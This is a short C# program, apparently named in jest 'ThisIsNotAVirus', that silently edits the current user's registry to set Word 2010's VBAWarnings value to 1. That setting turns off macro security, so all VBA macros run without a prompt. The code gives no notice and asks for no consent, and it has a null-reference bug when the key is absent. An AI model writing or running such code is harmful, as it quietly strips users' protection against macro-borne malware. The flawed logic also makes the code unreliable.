using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;


namespace ThisIsNotAVirus
{
    class Program
    {
        static void Main(string[] args)
        {
            RegistryKey myKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\14.0\\Word\\Security\\", true);
            if (myKey == null)
            {
                Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Office\\14.0\\Word\\Security\\");
            }
            myKey.SetValue("VBAWarnings", 1, RegistryValueKind.DWord);
        }
    }
}